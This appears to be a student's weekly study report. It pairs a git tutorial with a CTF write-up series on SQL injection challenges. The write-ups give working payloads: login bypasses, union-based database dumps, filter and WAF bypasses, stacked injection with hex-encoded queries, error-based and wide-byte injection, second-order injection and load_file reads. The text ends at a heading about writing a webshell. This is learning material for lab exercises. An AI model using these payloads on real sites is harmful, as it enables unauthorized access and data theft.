# *本周完成事项*

学习git语句

完善博客中的评论系统缺陷

完善青岑

------

# *下周待办事项*

学习python

学习文件包含漏洞

完善web大纲

------

# *内容分享*

# git的学习和使用


**这里是我借助deep seek学习git所得到的知识与自我理解，在这里分享同时方便后续查看**

## git解决的问题

git解决的是"存档"的事情,他把这个步骤自动化了,简单来说git就是一个存档机,当什么时候需要存档了,输入指令git就会帮我们记住,方便随时回调这个存档

## 总概

1，git提交存的是整个项目的快照，不是差异。（diff）差异是算出来给自己看的
2，三个区域（有点抽象)

```
 工作区（你正在编辑的文件）
    │  git add
    ▼
 暂存区（下一次提交要装进去的东西）
    │  git commit
    ▼
 版本库（不可变的提交历史）
```

工作区:你改动文件的地方,就是你看到的文件夹

暂存区:理解为一个准备发送货物的中转站,git add 就是向暂存区里传准备发送的东西

版本库:```.git```里的提交,提交后便作为历史存在,只能向上增加,不能修改(理论)

3,分支的本质是一个指向某个提交的指针.git switch切分支时,git把head挪到另一个指针,然后把工作区文件换成提交的样子

## 快照与差异

- 快照:这里我们可以把快照理解为游戏存档,一次提交就是一份项目的完整状态(一份存档),每一份存档都是完整的,他没有记录你的改动,他是直接把改完的整个app.py存进去.

- 差异:假如我们对文件进行一些改动,例如加了"你好",函数subtract(a,b)这时输入git show打出来就是

  ```
  +GREETING = "你好"
  +def subtract(a, b):
  ```

  这个差异是临时算出来的.git那里有两份文件(改前和改后),他把这两个文件进行比对,现场算出那里不一样并通过+ -显示给我们.差异(diff)从来没有被存储,他只是一种显示方式.

## git的基础命令(日常常用)

  git最常用的4条命令:

  ```
  git add.       git commit -m       git status        git log
  ```

   这四条命令准确来说可以分为两部分(一个动作,一双眼睛)
```git add. +git commit -m ```  同一个动作的两半.add是"点名要存什么",commit才是"存".和在一起算是一个动作
```git status + git log ```   一双眼睛.负责查看,不修改任何内容

  这四条可以构成一个最小完整闭环:看现状-点名-存档-查历史.

  下面用实例来进行演示,新建文件夹并打第一个存档(如```日记.txt```),在文件夹右键打开powershell窗口.

  记事本打开日记.txt,随意的加一行字如abab, ctrl+s保存,powershell输入```git status```,显示出红色的

  ```
  modified:   "\346\227\245\350\256\260.txt"
  ```

  ![image-20261020214621531](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261020214621531.png)

  

这个红色的**`\346\227\245\350\256\260.txt`**其实就是日记.txt.  git他默认把中文文件名按照八进制编码,这里我们输入

```
git config --global core.quotepath false
```

就可以解决,现在再输入一遍git status,他就变回正常的日记.txt![image-20261020215002833](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261020215002833.png)

现在我们回看这句modified,他的意思是我看到你的改动了.

现在我们告诉git要存下这个改动,输入git add .这里可能会弹警告

```
warning: in the working copy of '日记.txt', LF will be replaced by CRLF the next time Git touches it
```

这个警告只是在说下次取出文件的时候，会换成CRLF

现在我们敲

```
git commit -m "abababb"
```

再输入

```
git log --oneline
```

![image-20261021203626935](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261021203626935.png)

这个就是大体的流程

然后我们需要理解一个点：

​     假如改动了文件，但并没有敲```git commit```。这时```git log```看到的历史是改动前的内容。可见并不是说改动了文件，git就会知道，改动后只要没有```git commit```，他就只会存在于我们的文件里，并没有任何历史痕迹。```git status```能够看见这个改动，```git log```没法看到。
这也是为什么说```git add```之后需要```git commit```的原因，```add```只是点名强调一下我要改的内容，```commit```才是把他传上去的东西。

理解了之后再看一个新的工具```git diff```这个就是前文说的差异显示，执行后会用+和-来表示我们之前改动的内容

## 个人与多人协作下的远程仓库（基础命令）

现在我们已经改完了文件需要上传到仓库，这时就需要新的工具

最基础的是这三条

命令                                         作用                                      数据走向                                        用几次

------

```git clone```                  把远程仓库整个下载到本地              服务器-使用者                                   一次

------

```git pull```                    把远程的新提交拉下来并合并          服务器-使用者                                 每次推送前

------

```git push```                    把本地提交发送回到远程                 使用者-服务器                                 每次推送后

- ***git clone***

```git clone```的语法是

```
git clone <仓库地址> [本地文件夹名]
```

其中仓库地址是必填的（一般为仓库首页的url），本地文件夹名可有可无，如果不写的话就用仓库名当文件夹名。

eg：

```
# 最常用：文件夹名自动取仓库名
git clone https://gitlab.xxx.com/team/weekly-report.git

# 想换个文件夹名
git clone https://gitlab.xxx.com/team/weekly-report.git 我的文档
```

他的输出是

```
Cloning into 'weekly-report'...
Receiving objects: 100% (128/128), done.
```

这里总共执行了四件事：

    - 建文件夹
    - 下载全部历史
    - 配好origin
    - 把本地main和origin/main绑定

- ***git pull***
  ```git pull```的语法是

```
git pull [远程名] [分支名]
```

它有两种写法：

- ```git pull```         正常用就写这个（后面的两个可以省略）

- ```git pull origin main```         不在```main```上或者没连过远程的个人仓库时需要写
  eg：输入```git pull```，显示

  ```
  From https://gitlab.xxx.com/team/weekly-report
     a1b2c3d..e4f5g6h  main -> origin/main
  Updating a1b2c3d..e4f5g6h
  Fast-forward
   周报/2026-10-21-李四.md | 12 ++++++++++++
  ```

  `Fast-forward` = 顺利，无冲突。

  ```git pull```是把```git fetch```（下载）和```git merge```（合并）结合起来，一条就够

 - ***git push***

```git push```的语法是

  ```
  git push [-u] [远程名] [分支名]
  ```

  分三种写法：

- ```git push```        clone过的仓库用
- ```git push -u origin main```     首次推送，建立跟踪。clone下来的仓库不需要
- ```git push --force```        尽量不要用吗，会覆盖掉别人的提交

eg：输入```git push```

```
To https://gitlab.xxx.com/team/weekly-report.git
   e4f5g6h..i7j8k9l  main -> main
```

```main -> main```就是成功了

- **基础报错**

```! [rejected] ... (fetch first)
! [rejected] ... (fetch first)
```

这个报错的原因是上传时忘记了```git pull```，将它加上就行

```
! [remote rejected] ... (protected branch)
```

这个报错的原因是```main```被保护了，不能直接推，需要分支+合并请求

## 远程仓库上传

现在我们已经有了基础命令，可以尝试上传

首先在电脑上配身份

```
git config --global user.name "用户名"
git config --global user.email "GitHub邮箱"
```

接着用上文的git clone先把仓库拿下来

```
cd "存放地址"
git clone 网页url
cd java
```

输入后显示![image-20261022195436822](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261022195436822.png)

这里已经成功了，之所以有警告是因为我们的仓库目前还是空的，属于正常现象。输入cd java后我们就处于仓库之中

接下来我们建造一个测试文件txt

```
notepad test.txt
```

此时会显示找不到文件，是否创建，点击确认，随后随意敲入保存并关闭。接下来在git上查看，输入

```
git status
```

![image-20261022195834213](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261022195834213.png)

发现了txt，接着输入

```
git add .
git commit -m "添加测试文件 test.txt"
```

显示

```
[main (root-commit) a1b2c3d] 添加测试文件 test.txt
 1 file changed, 1 insertion(+)
 create mode 100644 test.txt
```

`root-commit` = 这个仓库的第一个提交，正常。

接着我们把本地的这个文件推到github上去，输入

```
git push -u origin main
```

显示

```
To url
 * [new branch]      main -> main
branch 'main' set up to track 'origin/main'.
```

到这里，我们就在github上成功上传了一次文件，可以在github上看到他。

## 如何把github上的错误文件删去

首先需要明确一点，GitHub是没有【撤回】按钮的，git的设计是**历史只增不减**，所以已经推上去的东西想要删去它，正确的做法是在提交一次将它删去

***文件传错了，想要删掉****

- 方法a：命令行输入

```
cd D:\github\java
git rm test.txt
git commit -m "删除误传的 test.txt"
git push
```

```git rm```=删掉文件+告诉git“这个删除要算进下次提交里面，上传之后刷新，文件就消失了

​         如果说只是向删去github上的，保留本地文件，输入

```
git rm --cached test.txt
```

`--cached` 只从 Git 里摘掉、本地文件还在。

- 方法b：网页删去

```
进仓库-点开文件-右上角垃圾桶-commit changes
```

但这个有一个弊端：会使得远程和本地不一致，下次push的时候必须要先git pull，否则会被拒

***撤销整个提交（提交信息写错，上传了几个不该传递）***

```
git log --oneline          # 找到要撤销的那条，记下哈希
git revert <哈希>
git push
```

git revent会生成一个反向提交，把那次提交的改动抵消掉，历史里仍然可以看到‘你撤销了文件“并追溯

注意：不要用 `git reset`，更不要 `git push --force`。那会改写历史，如果是组里的仓库，其他人拉过的东西会全部乱掉。

这里有一个特性：

删除文件后，再次点进文件路径会显示404，但仓库的commits里依然可以看到那次添加txt和删除txt。

这个并不是bug，能够追溯谁在什么时候提交什么，什么时候删了，是git存在的理由。

## 如何把自己仓库的文件传进组（Fork+Pull Request）

fork+request是团队协作的标准的做法，他有一个好处就是永远改不到组里的仓库，不会搞坏。

这是一个流程图

```
① 组里的仓库（upstream / 上游）
      │  网页点 Fork 按钮（一次性）
      ▼
② 你名下的副本（fork）
      │  命令行 clone（一次性）
      ▼
③ 你电脑上的仓库  D:\github\xxx
      │  每周：放周报 → add → commit → push
      ▼
④ 你的副本里有新提交
      │  网页点 Compare & pull request
      ▼
⑤ 负责人审查 → 点 Merge
      ▼
   周报出现在组里的仓库
```

这里需要有一个关键认知：个人的仓库是【副本】不是【分支】

------

| **Fork**         | **把整个仓库复制一份到使用者名下，独立的一份，历史一样**     |
| ---------------- | ------------------------------------------------------------ |
| **Pull Request** | **使用者向组里说"我这几条改动，请拉过去"，负责人点 Merge 才算合并** |

传组的命令还是上文的那几个命令，唯一多了两个东西是fork按钮和pull request

***fork按钮***

打开组仓库，在右上角，star旁边有一个fork，点一下，就会多一个同名仓库，标题下会写着```forked from 组名/仓库名```

区别这两个同名仓库

```
组里的：  组名/仓库名
你的：    你的用户名/仓库名    ← 标题下面有小字 "forked from 组名/仓库名"
```

注意clone的时候是自己那个仓库的地址，不是组里

***pull request***

上传完代码后，副本页面顶部会出现一条黄色提示条：**`Compare & pull request`** 点击。

之后填：

- 标题：
- 描述
- 往下拉，确认files changed里面只有我们要上交的文件（确认没有其他的东西）

最后creat pull request。等待负责人点merge。

# 青岑sql

## ezsql          （数字型联合注入）

打开题目是一个查分系统，输入示例2026001成功跳转，同时注意到url后面加上了```？id=2026001```得知是get请求方式，接着查看是什么注入和闭合方式，输入 ’ 并没有引起报错（因为sql的后台一般是SELECT * FROM users WHERE username='$input' AND password='$pass'这样的只输入 ‘ 的话，后台就会收到 ’ ‘ ’ 这样的属于语法错误），证明不是字符型注入，在bp上判断其闭合方式和是否为数字型。打开bp内置浏览器，打开此网页输入任意字符后，在历史里找到这个get请求，右键发送到攻击器选择username后的参数作为注入点。添加payload位置，在右侧的攻击框内选中类型位简单列表然后导入常用字典

```
 and 1=1 --  
 and 1=2 -- 
' and 1=1 --  
' and 1=2 --  
" and 1=1 --  
" and 1=2 --  
) and 1=1 --  
) and 1=2 --  
') and 1=1 --  
') and 1=2 --  
") and 1=1 --  
") and 1=2 --  
)) and 1=1 --  
)) and 1=2 --  
')) and 1=1 --  
')) and 1=2 --  
")) and 1=1 --  
")) and 1=2 --  
))) and 1=1 --  
))) and 1=2 --  
'))) and 1=1 --  
'))) and 1=2 --  
"))) and 1=1 --  
"))) and 1=2 -- 
```

在下方点击添加，添加前缀，因为我们刚刚试过了2026001可以登录，就添加这个作为前缀，攻击后查看结果![image-20261011203510200](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011203510200.png)

观察到这里显示为数字型注入且无闭合方式，输入数字型万能密码```1 or 1=1#```显示的结果与2026001一致万能密码走不通优先尝试联合注入。
在联合注入前先查看列数依次在url输入

```
2026001 order by 1
2026001 order by 2
2026001 order by 3
2026001 order by 4
2026001 order by 5
......
```

在输入到5时显示 （前四个均能正常查看）

```
Student ID not found. Please check and try again.
```

判断出列数为4，然后查看回显，在查询框输入

```
-1 union select 1,2,3,4
```

![image-20261011204636574](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011204636574.png)

发现4个回显位都可以用，我们选择2回显位（随便选一个回显位）输入

```
-1 union select 1,group_concat(schema_name),3,4 from information_schema.schemata
```

（查库名）

![image-20261011205952435](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011205952435.png)

发现除了系统库information_schema，还有一个库user，查这个库名里的表名，输入

```
-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='user'
```

（查表名）

![image-20261011210508347](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011210508347.png)

查到flag表，读取这个表的列名，输入

```
-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='user' and table_name='flag'
```

（查列名）![image-20261011210657214](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011210657214.png)

发现secret（一般flag就藏在这里）读取这个列，输入

```
-1 union select 1,secret,3,4 from user.flag
```

获得flag

## ezsql_1  (万能密码)

打开容器，里面显示了登录框，优先输入万能密码```' or 1=1#```成功注入获得flag
这里补充几个万能密码
知道目标用户时，可以在账号框注释掉密码：

```
账号：admin' -- 
密码：随便填
```

或在账号框构造恒真条件：

```
账号：' or 1=1 -- 
密码：随便填
```

或把 payload 放在密码框：

```
账号：随便填
密码：' or 1=1 --
```

或账号和密码一起输入时，可以使用不带注释符的写法：

```
账号：' or '1'='1
密码：' or '1'='1
```

或一种 MySQL 里比较特殊的写法：

```
账号：'='
密码：'='
```

或使用块注释符注释掉账号和密码中间的内容：

```
账号：'/*
密码：*/ or 1=1 --
```

## ezsql_2 (联合注入，字符型)

打开容器又是登录框，输入万能密码显示

```
Welcome admin
```

并没有给flag，优先怀疑联合注入

先查列数

```
账号：1' or 1=1 order by 1 -- 密码随意

账号：1' or 1=1 order by 2 -- 密码随意

账号：1' or 1=1 order by 3 -- 密码随意

账号：1' or 1=1 order by 4 -- 密码随意

账号：1' or 1=1 order by 5 -- 密码随意
```

在5时显示

```
Login failed.
```

得知有四列，接着查回显位，输入

```
账号：-1' union select 1,2,3,4 -- 密码随意
```

![image-20261011214209822](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011214209822.png)

获得回显位2，接着查库名，输入

```
账号-1' union select 1,group_concat(schema_name),3,4 from information_schema.schemata -- 密码随意
```

![image-20261011215127610](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011215127610.png)

有些像第一题，在user库里查表名，输入

```
账号-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='user' -- 密码随意
```

返回

```
Welcome flag
```

在flag表里查列名，输入

```
账号-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='user' and table_name='flag' -- 密码随意
```

![image-20261011215506160](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011215506160.png)

抓到secret，读取他输入

```
账号-1' union select 1,secret,3,4 from user.flag --  密码随意
```

获得flag

## ezsql_3   (单引号加小括号闭合方式的联合注入)

打开后输入万能密码，返回报错

```
SQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
```

优先怀疑闭合方式变化，在bp里查看闭合方式，攻击器里设payload，导入字典

```
 and 1=1 --  
 and 1=2 -- 
' and 1=1 --  
' and 1=2 --  
" and 1=1 --  
" and 1=2 --  
) and 1=1 --  
) and 1=2 --  
') and 1=1 --  
') and 1=2 --  
") and 1=1 --  
") and 1=2 --  
)) and 1=1 --  
)) and 1=2 --  
')) and 1=1 --  
')) and 1=2 --  
")) and 1=1 --  
")) and 1=2 --  
))) and 1=1 --  
))) and 1=2 --  
'))) and 1=1 --  
'))) and 1=2 --  
"))) and 1=1 --  
"))) and 1=2 -- 
```

前缀添加为admin（前两题的信息，用户名为admin）![image-20261011221837560](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261011221837560.png)

发现')的响应长度不一致，确定本题的闭合方式为‘），所以我们只需要重复ezsql_2的操作并把单引号改成单引号加括号就可以了，在最后输入

```
账号：-1') union select 1,secret,3,4 from user.flag --  
密码：随便填
```

获得flag

## ezsql_4  (双引号闭合的联合注入)

依旧输入万能密码，又显示报错，果断用bp先测一下在

```
admin" and 1=1 -- 
admin" and 1=2 -- 
```

这里的响应长度不一致，确定闭合方式为双引号。然后继续前两题的操作，把单引号改成双引号，在最后输入

```
账号：-1" union select 1,secret,3,4 from user.flag --  
密码：随便填
```

获得flag

## ezsql_5   (双引号加小括号闭合的联合注入)

万能密码！....报错（又来！）继续bp测闭合在

```
admin") and 1=1 -- 
admin") and 1=2 --
```

发现长度不一致，确定了闭合方式为双引号加小括号，继续前几题的操作，把单引号改为双引号加小括号，在最后输入

```
账号：-1"） union select 1,secret,3,4 from user.flag --  
密码：随便填
```

获得flag

## ezsql_6 (过滤#和 -- 的联合注入)

万能密码（有点不想说了），报错，麻木的发送bp......欸？所有的都是一致的，说明这次不是闭合方式的问题，但万能密码却行不通，怀疑过滤，依次尝试万能密码的字符，发现是 -- 被拦截，换用#还是被拦截，再换密码框也是，说明这次是双输入框过滤 -- 和#，那么尝试第三种注释/**/，因为本质还是联合注入，只是过滤了注释符，所以还是一样的操作，再最后输入

```
账号：-1' union select 1,secret,3,4 from user.flag where 1=1/*
密码：*/ and '1'='1
```

这里再补充两个

```
账号：随便填
密码：-1' union select 1,secret,3,4 from user.flag where '1'='1
```

（在密码框里注入）

或

```
账号：-1' union select 1,secret,3,4 from user.flag where 1=1 or '1'='1
密码：随便填
```

（账号框注入）

因为注释被ban所以这里就构造恒真条件代替

获得flag

## ezsql_7（过滤空格的联合注入)

万能密码......爆错！芜！！！

不发癫了，逐个排查一下发现‘，or，1=1，#都正常，真相只有一个........空格！想办法进行空格绕过

1，小括号绕过，步骤一样，只是换成小括号

```
账号：1'UNION(SELECT(1),secret,(3),(4)FROM(user.flag))#
密码：随便
```

2，注释符绕过，用/**/

```
账号：-1'union/**/select/**/1,secret,3,4/**/from/**/user.flag#
密码：随便
```

3，编码绕过（感觉这个好麻烦）

```
?username=-1'union%0cselect%0c1,secret,3,4%0cfrom%0cuser.flag--%0c&password=随便
```

获得flag

## ezsql_8 (双写加过滤空格的联合注入)

万能密码...爆爆！

排查过滤点，又是空格，把上一题的三种方式随便弄一个上去，欸，还是报错，这里报错显示

```
SQL Error: SELECT * FROM flag WHERE name = '-1'/**//**/1,secret,3,4/**//**/user.#' AND passwd = '1111'
```

可以看见union select， from被吞了，优先联想双写绕过，改为uniunionon这种的，本质是他检测到这三个词就吞掉，那我们就输入这样写，他吞掉之后，剩下的字母又刚好可以组成我们想要的词，进而进行注入，同一个步骤，在最后注入

```
账号：-1'uniunionon/**/seselectlect/**/1,secret,3,4/**/ffromrom/**/user.flflagag#
密码：随便
```

获得flag

## ezsql_9（单输入框数字型联合注入）

打开后只有一个输入框，输入 ’ 返回

```
Query failed
```

不是报错，说明不是字符型注入，输入1正常回显，在bp里检测一下是否为数字型和闭合方式，召唤字典！

```
 and 1=1 --  
 and 1=2 -- 
' and 1=1 --  
' and 1=2 --  
" and 1=1 --  
" and 1=2 --  
) and 1=1 --  
) and 1=2 --  
') and 1=1 --  
') and 1=2 --  
") and 1=1 --  
") and 1=2 --  
)) and 1=1 --  
)) and 1=2 --  
')) and 1=1 --  
')) and 1=2 --  
")) and 1=1 --  
")) and 1=2 --  
))) and 1=1 --  
))) and 1=2 --  
'))) and 1=1 --  
'))) and 1=2 --  
"))) and 1=1 --  
"))) and 1=2 -- 
```

添加前缀 1 开始攻击发现只有第一个不一样

```
1 and 1=1 -- 
1 and 1=2 --
```

同时也没有任何过滤，那这个和第一题不就一样了嘛！最后输入

```
-1 union select 1,flag,3,4 from user.flag
```

获得flag

## ezsql_10（单引号字符型闭合的联合注入）

有点像_9 ，万能密码成功，同时bp字典查看![image-20261012221057798](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261012221057798.png)

发现是单引号闭合的字符型注入，检查没有任何过滤，直接输入

```
-1' union select 1,flag,3,4 from user.flag -- 
```

获得flag

## ezsql_11（禁用select的堆叠注入）

打开容器，依旧但输入框，输入1正确显示，万能密码也正常，直接联合查询，看我联合查询神.... 欸，不对，怎么报错了？

看一下什么情况，发现他把select给ban掉了，select被ban了的话就优先尝试存不存在堆叠注入，输入

```
1'; do sleep(5);
```

页面确实有5秒的延迟，证明了堆叠注入确实可以用，那么我们就拿针对堆叠注入的最终兵器喵.... 

输入

```
-1'; SET @q=0x73656c65637420666c61672066726f6d20666c6167; PREPARE s FROM @q; EXECUTE s;#
```

直接一把嗦获得flag

这里的原理是这样的

```
1. @q = 0x73656c656374... 
   → 解码成字符串："select flag from flag"
   
2. PREPARE s FROM @q
   → 把这条 SQL 预编译好
   
3. EXECUTE s
   → 执行它，查出 flag
```

但是这个一把嗦的payload也有弊端就是只要waf没拦SET、PREPARE，有堆叠注入才可以用，那要是waf拦了呢？我们就换用

```
-1'; SELECT CONCAT(0x73656c65637420666c61672066726f6d20666c6167) INTO @sql; PREPARE s FROM @sql; EXECUTE s;#
```

这个也能出，所以说基本上只要确定是堆叠注入就可以用。

现在再附上一个正常解这题的方法（找康可可的）

先用 `show` 枚举表：

```sql
1'; show tables;
```

得知有 `employees;flag` 两个表。

接下来可以用 Handler 句柄法来读取字段数据。

> `handler` 是 MySQL 专属语法，可以不使用 `select` 读取表数据。

输入：

```sql
# 打开表句柄，读取第一行
1'; handler flag open;handler flag read first;
```

获取flag

## ezsql_12 (报错注入？管他呢，布尔盲注！)

打开网页

万能密码成功，但这里只有登录成功，并没有显示用户名（开始怀疑）..... 怀疑他干嘛，布尔脚本，撕咬它！

直接打开布尔脚本，这里的脚本是自己的有使用方法，复制顶部url信息，把username那里用 * 来标注注入点弄成username=*这样的然后随便输入并回车运行，然后检测显示出确实存在盲注，直接点开2号脚本，输入我们有 * 的url回车等待脚本成功，获得flag

有点简单，报错注入也来一下

先试试联合注入，在测试列数

```
账号：1' or 1=1 order by 1 -- 
密码：随便填

账号：1' or 1=1 order by 2 -- 
密码：随便填

账号：1' or 1=1 order by 3 -- 
密码：随便填

账号：1' or 1=1 order by 4 -- 
密码：随便填
```

在4的时候报错，注意这里是报错是SQL 报错信息，尝试 ```updatexml()```报错注入（康可可大人救我！）

**查询数据库名**
输入：

```sql
账号：1' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) -- 
密码：随便填
```


返回：

```txt
~information_schema,user~
```

**查询库 user 的表名**
输入：

```sql
账号：1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='user'),0x7e),1) -- 
密码：随便填
```


返回：

```txt
~flag,users~
```

**查询表 flag 的列名**
输入：

```sql
账号：1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='user' and table_name='flag'),0x7e),1) -- 
密码：随便填
```


返回：

```txt
~id,flag~
```

**查询列 flag 的字段内容**
先判断字段内容长度，输入：

```sql
账号：1' and updatexml(1,concat(0x7e,(select length(group_concat(flag)) from user.flag),0x7e),1) -- 
密码：随便填
```


返回：

```txt
~42~
```


分段读取字段内容，输入：

```sql
# 读取第 1-30 位
账号：1' and updatexml(1,concat(0x7e,substr((select group_concat(flag) from user.flag),1,30),0x7e),1) -- 
密码：随便填
```


和

```sql
读取第 31-42 位
账号：1' and updatexml(1,concat(0x7e,substr((select group_concat(flag) from user.flag),31,42),0x7e),1) -- 
密码：随便填
```

拼接得到 flag。

## ezsql_13(布尔盲注！！！)

打开容器，万能密码注入显示成功，输入1还是成功再输入

```
1' and length(database())>0 --
```

还是成功，确定了，就是布尔盲注，终于是正经盲注了，脚本启动！继续上题的步骤，成功获得flag

## ezsql_14(时间盲注！)

万能密码.....欸？我回显呢？怎么就只有

```
The query results have been sent to your email.
```

不信，输入1，怎么还是？难道说.....是时间盲注？验证一下，打开1号脚本，按照上述操作实施，1号脚本显示时间盲注存在，那么我们就直接用二号脚本找flag,按照上述题的步骤输入，获得flag

## ezsql_15（宽字节注入）

来到双输入框，管他呢，万能密码 ，失败！bp字典，失败！！！怎么回事，思考宽字节....对，宽字节!试一下%df因为是url编码，再url地址栏内操作，输入

```
?username=%df%27%20OR%201=1%23&password=111
```

显示

```
Welcome admin
```

可知确实是宽字节注入，还是联合注入那么我们就直接再url上拼我们前几天的联合注入的最后一步，只是改为宽字节

```
?username=-1%df' union select 1,secret,3,4 from user.flag --  +&password=1
```

获得flag

## ezsql_16(数据库为SQLite的联合注入)

打开容器，是登录框，输入万能密码，显示报错

```
SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "#" in/var/www/html/index.php    on line38
```

可知这次的数据库不再是MySQL，而是 SQLite，那么就转用SQLite的语法，还是一样联合注入，先测列数

```
账号：1' or 1=1 order by 1 -- 
密码：随便填

账号：1' or 1=1 order by 2 -- 
密码：随便填

账号：1' or 1=1 order by 3 -- 
密码：随便填

账号：1' or 1=1 order by 4 -- 
密码：随便填

账号：1' or 1=1 order by 5 -- 
密码：随便填
```

得知在5的时候回显错误，确定为四列，接着判断回显位

```
账号：-1' union select 1,2,3,4 -- 
密码：随便填
```

显示Welcome 2，确定2为回显位 ，由于sqlite无法爆库名，所以直接来爆表名，输入

```
账号：-1' union select 1,group_concat(name),3,4 from sqlite_master where type='table' -- 
密码：随便填
```

回显显示flag，获得表名flag，接着查看flag表里的列名，输入

```
账号：-1' union select 1,sql,3,4 from sqlite_master where type='table' and name='flag' -- 
密码：随便填
```

获得回显

```
Welcome CREATE TABLE flag (id INTEGER, name TEXT, passwd TEXT, secret TEXT)
```

获得列名id,name,passwd,secret，直接查secrect，输入

```
账号：-1' union select 1,group_concat(secret),3,4 from flag -- 
密码：随便填
```

获得flag

## ezsql_17(数据库为SQLite的布尔盲注)

这次是查询框，开始怀疑是不是又是SQLite的数据库，先输入万能密码，显示报错

```
 SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "#" in/var/www/html/index.phpon line 46
```

判定为SQLite的数据库，先输入1，2，3，都显示查询成功并没有显示查询内容，怀疑一下布尔盲注，用脚本检测一下，1号脚本显示确实存在，在二号脚本输入本题url爆破获得flag

## ezsql_18（二次注入＋万能密码）

打开容器来到登录框，输入万能密码失效同时发现有注册页面，怀疑二次注入

```
二次注入就是在注册页面里在数据库里面注入语句，这时只是用户名（服务器把他当作字符处理了），然后登录的时候，数据库内部调用这个的以为是个用户名，但本质是万能密码，直接是万能密码的原理把后台的那个username''&password''搞炸（从内部调取出来刚好拼接上sql语句，触发）
其实就是禁止数据库外部注入，登录页面只能调取内部数据，其余一切过滤
这样看起来二次注入成功后获得的是管理员身份，毕竟是万能密码的原理，只是在外面套了个保护层

以上为自己总结的二次注入原理
```

在注册区输入万能密码并注册，返回登录去，输入刚刚注册的万能密码，调用来达到sql注入的目的，获得flag

## ezsql_19 （二次注入＋联合注入）

打开容器，又是登录和注册都有的形式，继续二次注入，但是这次注入后的回显为

```
欢迎回来，' or 1=1 -- 。 
```

并没有flag，怀疑联合注入，在注册去先注入一遍再在登陆区输入一遍，先查列数（往后的每一步都要先注册在登陆总共两遍）

```
账号：1' or 1=1 order by 1 -- 
密码：随便填

账号：1' or 1=1 order by 2 -- 
密码：随便填

账号：1' or 1=1 order by 3 -- 
密码：随便填
```

在第三列时回显

```
查询异常：Unknown column &#039;4&#039; in &#039;ORDER BY&#039;
```

确定列数为2列，判断回显

```
账号：-1' union select 1,2 -- 
密码：随便填
```

获得回显位2，接着查库名

```
账号：-1' union select 1,group_concat(schema_name) from information_schema.schemata -- 
密码：随便填
```

回显

```
information_schema,user
```

查user库里的表名

```
账号：-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='user' -- 
密码：随便填
```

回显

```
user_notes,users,flags
```

查flag表的列名

```
账号：-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='user' and table_name='flags' -- 
密码：随便填
```

回显

```
flag
```

接着读取它

```
账号：-1' union select 1,flag from user.flags --  
密码：随便填
```

获得flag

## ezsql_20 (post请求，过滤逗号的联合注入)

打开容器，优先尝试万能密码，成功获得信息，但无flag，尝试联合注入，测列数

```
账号：1' or 1=1 order by 1 -- 
密码：随便填

账号：1' or 1=1 order by 2 -- 
密码：随便填

账号：1' or 1=1 order by 3 -- 
密码：随便填
```

在4时显示

```
查询失败，请检查公告编号。
```

得知有三列，接下来测回显位，输入

```
-1' union select 1,2,3 -- 
```

显示非法字符

![image-20261022215059258](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261022215059258.png)

排查是哪个被过滤了，但神奇的是-1，‘，union select，123，注释符和空格都没有报错，所以出题人过滤了逗号！（好阴险...）

将逗号换为join配合子查询来代替union select 1，2，3 -- 即更换为

```
-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c #
```

成功回显![image-20261022220711242](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261022220711242.png)

以3作为回显位，输入

```
-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT group_concat(schema_name) FROM information_schema.schemata)c #
```

读库名显示

```
information_schema,ezsql20
```

读去ezsql20的表，输入

```
-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='ezsql20')c #
```

回显显示为

```
flag,notices
```

读取flag的列，输入

```
-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='ezsql20' AND table_name='flag')c #
```

回显显示为

```
id,secret,note
```

读取secret

```
-1' union select * from (select 1)a join (select group_concat(secret) from flag )b cross join (select 3)c #
```

获得flag(经过询问出题人删去了注释符 -- )

## ezsql_21（文件读写）

打开容器，输入万能密码正常显示，尝试联合注入.....欸？为什么把表扒烂了都没见flag，我flag呢！qaq.....怀疑方向出现问题，想到sql注入里还有一个类型--文件注入，看一下文件注入的可行性，f12查看源代码，找到线索啦！

![image-20261023175228574](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261023175228574.png)

这里显示出来了flag的位置

```
 flag in /conquer_secret.txt 
```

在输入栏中输入

```
-1' union select 1,load_file('/conquer_secret.txt'),3 -- 
```

读取文件，成功获得flag

## ezsql_22 (文件读写,过滤load_file的写入木马类)

